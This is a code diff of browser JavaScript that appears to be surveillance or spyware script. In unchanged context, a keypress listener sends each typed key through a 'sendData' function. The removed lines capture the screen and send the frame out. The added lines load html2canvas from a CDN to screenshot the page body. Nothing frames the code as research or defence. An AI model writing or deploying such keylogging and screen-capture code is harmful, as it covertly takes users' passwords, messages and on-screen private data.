@@ -3,25 +3,36 @@ const util = [
   document.addEventListener("keypress", async (event) => {
     await sendData(event.key)
 }),
-  async () => {
-  const canvas = document.createElement("canvas");
-  const context = canvas.getContext("2d");
-  const video = document.createElement("video");
-
-  try {
-    const captureStream = await navigator.mediaDevices.getDisplayMedia();
-    video.srcObject = captureStream;
-    context.drawImage(video, 0, 0, window.width, window.height);
-    const frame = canvas.toDataURL("image/png");
-    captureStream.getTracks().forEach(track => track.stop());
-    await sendData(frame);
-  } catch (err) {
-    console.error("Error: " + err);
-  }
+  () => {
+  var script = document.createElement('script');
+   script.setAttribute('src', 'https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.5/dist/html2canvas.min.js');
+   script.setAttribute('type', 'text/javascript');
+    script.async = false
+    script.addEventListener('load', function() {
+    // The script is loaded completely
+    console.log("im working")
+    html2canvas(document.body, {
+    allowTaint: true,
+    useCORS: true,
+  })
+.then(function (canvas) {
+  // It will return a canvas element
+  let image = canvas.toDataURL("image/png", 0.5);
+  console.log(image)
+})
+.catch((e) => {
+  // Handle errors
+  console.log(e);
+});
+});
+   document.body.appendChild(script);
+    
+    
+  
 },
 
   () => {
-    document.body.innerHTML += '<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.js" integrity="sha512-sn/GHTj+FCxK5wam7k9w4gPPm6zss4Zwl/X9wgrvGMFbnedR8lTUSLdsolDRBRzsX6N+YgG6OWyvn9qaFVXH9w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>'
+    document.body.innerHTML += '<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.5/dist/html2canvas.min.js"></script>'
     const screenshotTarget = document.body;
     console.log(screenshotTarget)
 html2canvas(screenshotTarget).then(async (canvas) => {
